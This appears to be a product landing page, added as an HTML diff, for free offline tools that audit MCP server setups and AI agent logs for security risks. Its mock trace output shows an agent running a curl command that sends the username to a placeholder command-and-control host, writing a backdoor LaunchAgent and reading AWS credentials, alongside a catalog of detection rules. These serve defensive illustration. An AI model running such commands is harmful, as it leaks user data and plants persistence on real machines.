@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Onyx MCP Security Suite</title>
+<style>
+  :root {
+    --purple: #5B44C3;
+    --purple-light: #7B64E3;
+    --purple-dim: #2d2460;
+    --red: #e05252;
+    --amber: #d97706;
+    --green: #16a34a;
+    --bg: #0f0e17;
+    --bg2: #1a1830;
+    --bg3: #221f3a;
+    --text: #e8e6f0;
+    --text-dim: #8b87a8;
+    --border: #2d2a4a;
+    --mono: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace;
+    --sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    line-height: 1.6;
+    padding: 0;
+  }
+
+  /* Hero */
+  .hero {
+    background: linear-gradient(135deg, #0f0e17 0%, #1a1340 50%, #0f0e17 100%);
+    border-bottom: 1px solid var(--border);
+    padding: 64px 40px 56px;
+    text-align: center;
+  }
+  .logo-mark {
+    font-family: var(--mono);
+    font-size: 13px;
+    letter-spacing: 6px;
+    color: var(--purple);
+    text-transform: uppercase;
+    margin-bottom: 24px;
+    opacity: 0.9;
+  }
+  .hero h1 {
+    font-size: 42px;
+    font-weight: 700;
+    line-height: 1.15;
+    margin-bottom: 20px;
+    background: linear-gradient(135deg, #ffffff 0%, #c4bcf0 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+  .hero-sub {
+    font-size: 18px;
+    color: var(--text-dim);
+    max-width: 560px;
+    margin: 0 auto 36px;
+  }
+  .cmd-pair {
+    display: inline-flex;
+    flex-direction: column;
+    gap: 8px;
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 20px 28px;
+    font-family: var(--mono);
+    font-size: 15px;
+    text-align: left;
+    margin-bottom: 28px;
+  }
+  .cmd-line { display: flex; gap: 12px; align-items: center; }
+  .cmd-text { color: #a8d8a8; }
+  .cmd-comment { color: var(--text-dim); font-size: 13px; }
+  .badges {
+    display: flex;
+    gap: 10px;
+    justify-content: center;
+    flex-wrap: wrap;
+    margin-top: 4px;
+  }
+  .badge {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 20px;
+    padding: 4px 14px;
+    font-size: 12px;
+    color: var(--text-dim);
+    letter-spacing: 0.3px;
+  }
+  .badge.purple { border-color: var(--purple); color: var(--purple-light); }
+
+  /* Layout */
+  .page { max-width: 960px; margin: 0 auto; padding: 0 24px; }
+
+  /* Two-col tools */
+  .tools-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1px;
+    background: var(--border);
+    border-top: 1px solid var(--border);
+    border-bottom: 1px solid var(--border);
+  }
+  .tool-col {
+    background: var(--bg);
+    padding: 48px 40px;
+  }
+  .tool-tag {
+    font-family: var(--mono);
+    font-size: 11px;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--purple);
+    margin-bottom: 12px;
+  }
+  .tool-col h2 {
+    font-size: 26px;
+    font-weight: 700;
+    margin-bottom: 10px;
+  }
+  .tool-col .tagline {
+    color: var(--text-dim);
+    font-size: 15px;
+    margin-bottom: 28px;
+    line-height: 1.5;
+  }
+
+  /* Terminal mock */
+  .terminal {
+    background: #0a0910;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    font-family: var(--mono);
+    font-size: 12px;
+    line-height: 1.65;
+    margin-bottom: 28px;
+  }
+  .term-bar {
+    background: var(--bg3);
+    padding: 8px 14px;
+    display: flex;
+    gap: 6px;
+    align-items: center;
+    border-bottom: 1px solid var(--border);
+  }
+  .dot { width: 10px; height: 10px; border-radius: 50%; }
+  .dot-r { background: #ff5f57; }
+  .dot-y { background: #ffbd2e; }
+  .dot-g { background: #28c840; }
+  .term-body { padding: 16px 18px; white-space: pre; overflow-x: auto; }
+  .t-purple { color: var(--purple-light); }
+  .t-red    { color: var(--red); }
+  .t-amber  { color: var(--amber); }
+  .t-green  { color: #6fcf97; }
+  .t-dim    { color: var(--text-dim); }
+  .t-bold   { font-weight: 700; }
+  .t-white  { color: #ffffff; }
+
+  /* Rule tables */
+  .rules-section {
+    padding: 56px 40px;
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+  }
+  .section-label {
+    font-size: 11px;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--purple);
+    margin-bottom: 8px;
+  }
+  .rules-section h2 {
+    font-size: 28px;
+    font-weight: 700;
+    margin-bottom: 8px;
+  }
+  .rules-section .intro {
+    color: var(--text-dim);
+    margin-bottom: 32px;
+    max-width: 640px;
+  }
+  .rule-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 12px;
+  }
+  .rule-card {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 16px 18px;
+  }
+  .rule-card:hover { border-color: var(--purple); }
+  .rule-id {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--purple-light);
+    margin-bottom: 4px;
+  }
+  .rule-name {
+    font-size: 13px;
+    font-weight: 600;
+    margin-bottom: 4px;
+  }
+  .rule-sev {
+    font-size: 11px;
+    font-family: var(--mono);
+    padding: 2px 8px;
+    border-radius: 3px;
+    display: inline-block;
+  }
+  .sev-crit { background: rgba(224,82,82,0.15); color: var(--red); }
+  .sev-high { background: rgba(217,119,6,0.15); color: var(--amber); }
+  .sev-med  { background: rgba(91,68,195,0.15); color: var(--purple-light); }
+  .sev-low  { background: rgba(139,135,168,0.1); color: var(--text-dim); }
+  .sev-info { background: rgba(139,135,168,0.05); color: var(--text-dim); }
+
+  /* Framework */
+  .frameworks {
+    padding: 48px 40px;
+    border-bottom: 1px solid var(--border);
+  }
+  .fw-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 20px;
+    margin-top: 28px;
+  }
+  .fw-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 20px 22px;
+  }
+  .fw-name {
+    font-size: 13px;
+    font-weight: 700;
+    margin-bottom: 8px;
+    color: var(--purple-light);
+  }
+  .fw-items {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-dim);
+    line-height: 2;
+  }
+
+  /* Trust section */
+  .trust {
+    padding: 48px 40px;
+    border-bottom: 1px solid var(--border);
+    background: var(--bg);
+  }
+  .trust-grid {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 24px;
+    max-width: 960px;
+    margin: 0 auto;
+  }
+  .trust-item { }
+  .trust-icon { font-size: 22px; margin-bottom: 10px; }
+  .trust-item h3 { font-size: 15px; margin-bottom: 6px; }
+  .trust-item p { font-size: 13px; color: var(--text-dim); line-height: 1.6; }
+
+  /* Footer */
+  .footer {
+    background: var(--bg2);
+    border-top: 1px solid var(--border);
+    padding: 32px 40px;
+    text-align: center;
+    color: var(--text-dim);
+    font-size: 14px;
+  }
+  .footer a { color: var(--purple-light); text-decoration: none; }
+  .footer strong { color: var(--text); }
+
+  @media (max-width: 720px) {
+    .tools-grid { grid-template-columns: 1fr; }
+    .rule-grid { grid-template-columns: 1fr 1fr; }
+    .fw-grid { grid-template-columns: 1fr; }
+    .trust-grid { grid-template-columns: 1fr 1fr; }
+    .hero h1 { font-size: 30px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="hero">
+  <div class="logo-mark">◆ Onyx Security</div>
+  <h1>MCP Security Suite</h1>
+  <p class="hero-sub">
+    Two free CLI tools that answer the questions every developer using MCP should be asking.
+    Fully offline. No account. No data sent anywhere.
+  </p>
+  <div class="cmd-pair">
+    <div class="cmd-line">
+      <span class="cmd-text">npx @aspex/scan</span>
+      <span class="cmd-comment"># audit before you run</span>
+    </div>
+    <div class="cmd-line">
+      <span class="cmd-text">npx @aspex/trace</span>
+      <span class="cmd-comment"># see what ran after</span>
+    </div>
+  </div>
+  <div class="badges">
+    <span class="badge">Apache-2.0</span>
+    <span class="badge">cosign-signed</span>
+    <span class="badge">SLSA provenance</span>
+    <span class="badge purple">offline by default</span>
+    <span class="badge">no account required</span>
+  </div>
+</div>
+
+<div class="tools-grid">
+
+  <div class="tool-col">
+    <div class="tool-tag">Tool 1</div>
+    <h2>onyx-mcp-scan</h2>
+    <p class="tagline">Reads your MCP client configs, connects to each server, enumerates all tools and capabilities, and produces a scored risk report.</p>
+
+    <div class="terminal">
+      <div class="term-bar">
+        <div class="dot dot-r"></div>
+        <div class="dot dot-y"></div>
+        <div class="dot dot-g"></div>
+      </div>
+      <div class="term-body"><span class="t-purple t-bold">◆ Onyx MCP Scan  v0.1.0</span>
+
+Scanned 3 clients  9 servers  64 tools  2.3s
+
+<span class="t-bold">Setup score:  <span class="t-red">22 / 100   HIGH RISK</span></span>
+2 critical  4 high  3 medium  1 low
+
+<span class="t-red t-bold">CRITICAL</span>
+<span class="t-red">●</span> filesystem-mcp     (Cursor)    score 12
+  MCP003  <span class="t-dim">Shell execution: run_command</span>
+  MCP006  <span class="t-dim">AWS_SECRET_ACCESS_KEY in env</span>
+  MCP014  <span class="t-dim">get_cookies: browser keychain</span>
+
+<span class="t-amber t-bold">HIGH</span>
+<span class="t-amber">●</span> web-fetch-mcp     (Claude)    score 44
+  MCP001  <span class="t-dim">Prompt injection in description</span>
+  MCP005  <span class="t-dim">Unrestricted fetch, no allow-list</span>
+
+<span class="t-green">OK</span>
+<span class="t-dim">●</span> <span class="t-dim">time-mcp  github-mcp (v1.2.3)</span></div>
+    </div>
+  </div>
+
+  <div class="tool-col">
+    <div class="tool-tag">Tool 2</div>
+    <h2>onyx-agent-trace</h2>
+    <p class="tagline">Reads the native logs that Claude Desktop and Cursor already write. Parses them into a security-annotated audit trail. No proxy. No config change.</p>
+
+    <div class="terminal">
+      <div class="term-bar">
+        <div class="dot dot-r"></div>
+        <div class="dot dot-y"></div>
+        <div class="dot dot-g"></div>
+      </div>
+      <div class="term-body"><span class="t-purple t-bold">◆ Onyx Agent Trace  v0.1.0</span>
+
+Clients: Claude Desktop, Cursor
+Sessions: 6  (last 24h)   Tool calls: 243
+
+<span class="t-red t-bold">CRITICAL</span>
+<span class="t-red">●</span> [02:17:44] cursor / filesystem-mcp
+  run_command  "curl https://c2.evil.example/$(whoami)"
+  <span class="t-dim">AT003  Shell command executed</span>
+  <span class="t-dim">AT002  Outbound network call</span>
+
+<span class="t-red">●</span> [02:17:46] cursor / filesystem-mcp
+  write_file  ~/Library/LaunchAgents/backdoor.plist
+  <span class="t-dim">AT014  Persistence mechanism write</span>
+
+<span class="t-amber t-bold">HIGH</span>
+<span class="t-amber">●</span> [02:17:41] cursor / filesystem-mcp
+  read_file  /Users/alice/.aws/credentials
+  <span class="t-dim">AT001  Sensitive path accessed</span>
+
+<span class="t-green">OK</span>  <span class="t-dim">237 tool calls showed no anomalies.</span></div>
+    </div>
+  </div>
+
+</div>
+
+<div class="rules-section">
+  <div class="page">
+    <div class="section-label">Rule catalog</div>
+    <h2>26 mcp-scan rules + 20 agent-trace rules</h2>
+    <p class="intro">Every finding maps to OWASP LLM Top 10 2025, MITRE ATLAS, and CWE. Rules are data-driven and community-extensible.</p>
+
+    <div class="rule-grid">
+      <div class="rule-card">
+        <div class="rule-id">MCP001</div>
+        <div class="rule-name">Prompt injection in tool description</div>
+        <span class="rule-sev sev-high">HIGH</span>
+      </div>
+      <div class="rule-card">
+        <div class="rule-id">MCP002</div>
+        <div class="rule-name">Homoglyph / deceptive tool name</div>
+        <span class="rule-sev sev-high">HIGH</span>
+      </div>
+      <div class="rule-card">
+        <div class="rule-id">MCP003</div>
+        <div class="rule-name">Shell / exec capability</div>
+        <span class="rule-sev sev-crit">CRITICAL</span>
+      </div>
+      <div class="rule-card">
+        <div class="rule-id">MCP006</div>
+        <div class="rule-name">Secrets in plaintext env</div>
+        <span class="rule-sev sev-crit">CRITICAL</span>
+      </div>
+      <div class="rule-card">
+        <div class="rule-id">MCP008</div>
+        <div class="rule-name">Persistence mechanism capability</div>
+        <span class="rule-sev sev-crit">CRITICAL</span>
+      </div>
+      <div class="rule-card">
+        <div class="rule-id">MCP014</div>
+        <div class="rule-name">Browser cookies / OS keychain</div>
+        <span class="rule-sev sev-crit">CRITICAL</span>
+      </div>
+      <div class="rule-card">
+        <div class="rule-id">MCP017</div>
+        <div class="rule-name">CI/CD pipeline write access</div>
+        <span class="rule-sev sev-crit">CRITICAL</span>
+      </div>
+      <div class="rule-card">
+        <div class="rule-id">MCP020</div>
+        <div class="rule-name">Arbitrary code execution (eval)</div>
+        <span class="rule-sev sev-crit">CRITICAL</span>
+      </div>
+      <div class="rule-card">
+        <div class="rule-id">MCP023</div>
+        <div class="rule-name">Cloud metadata endpoint (IMDS)</div>
+        <span class="rule-sev sev-crit">CRITICAL</span>
+      </div>
+      <div class="rule-card">
+        <div class="rule-id">AT003</div>
+        <div class="rule-name">Shell command executed (trace)</div>
+        <span class="rule-sev sev-crit">CRITICAL</span>
+      </div>
+      <div class="rule-card">
+        <div class="rule-id">AT007</div>
+        <div class="rule-name">Cloud metadata endpoint access</div>
+        <span class="rule-sev sev-crit">CRITICAL</span>
+      </div>
+      <div class="rule-card">
+        <div class="rule-id">AT014</div>
+        <div class="rule-name">Persistence mechanism write</div>
+        <span class="rule-sev sev-crit">CRITICAL</span>
+      </div>
+    </div>
+    <p style="margin-top:20px; font-size:13px; color:var(--text-dim)">
+      Showing 12 of 46 rules. Full catalog at github.com/aspex-security/aspex
+    </p>
+  </div>
+</div>
+
+<div class="frameworks">
+  <div class="page">
+    <div class="section-label">Framework coverage</div>
+    <div class="fw-grid">
+      <div class="fw-card">
+        <div class="fw-name">OWASP LLM Top 10 2025</div>
+        <div class="fw-items">LLM01  Prompt Injection
+LLM02  Sensitive Info Disclosure
+LLM03  Supply Chain
+LLM06  Excessive Agency
+LLM08  Excessive Permissions</div>
+      </div>
+      <div class="fw-card">
+        <div class="fw-name">MITRE ATLAS</div>
+        <div class="fw-items">AML.T0010  Supply Chain
+AML.T0043  Craft Adversarial Data
+AML.T0048  Backdoor
+AML.T0051  Prompt Injection
+AML.T0057  Data Leakage</div>
+      </div>
+      <div class="fw-card">
+        <div class="fw-name">CWE (selected)</div>
+        <div class="fw-items">CWE-22   Path Traversal
+CWE-78   OS Command Injection
+CWE-89   SQL Injection
+CWE-94   Code Injection
+CWE-312  Cleartext Storage
+CWE-918  SSRF</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="trust">
+  <div class="trust-grid">
+    <div class="trust-item">
+      <div class="trust-icon">🔒</div>
+      <h3>Fully offline</h3>
+      <p>No telemetry. No phone-home. No data sent anywhere. Both tools work air-gapped. The only network call is the binary download at install time.</p>
+    </div>
+    <div class="trust-item">
+      <div class="trust-icon">✅</div>
+      <h3>Signed and verified</h3>
+      <p>Release binaries are signed with cosign (keyless, Sigstore). SLSA provenance and SPDX SBOM published with every release. Verify the checksum before running.</p>
+    </div>
+    <div class="trust-item">
+      <div class="trust-icon">🔓</div>
+      <h3>Open source (Apache-2.0)</h3>
+      <p>Full source on GitHub. Deterministic builds. No obfuscation. Security tools that aren't auditable should not be trusted.</p>
+    </div>
+    <div class="trust-item">
+      <div class="trust-icon">⚡</div>
+      <h3>Read-only, always</h3>
+      <p>These tools never modify your configs, your log files, or anything else on disk. They read, analyze, and report.</p>
+    </div>
+  </div>
+</div>
+
+<div class="footer">
+  <strong>Onyx MCP Security Suite</strong> is free and open-source.<br>
+  <a href="https://github.com/aspex-security/aspex">github.com/aspex-security/aspex</a> &nbsp;·&nbsp;
+  Apache-2.0 &nbsp;·&nbsp;
+  Built by <a href="https://onyx.security">Onyx Security</a>
+  <br><br>
+  <span style="font-size:12px;">
+    These tools scan one machine at a time.
+    <a href="https://onyx.security">Onyx</a> adds fleet-wide continuous monitoring, MCP gateway enforcement, and attack-path correlation.
+    No signup required to keep using these tools.
+  </span>
+</div>
+
+</body>
+</html>
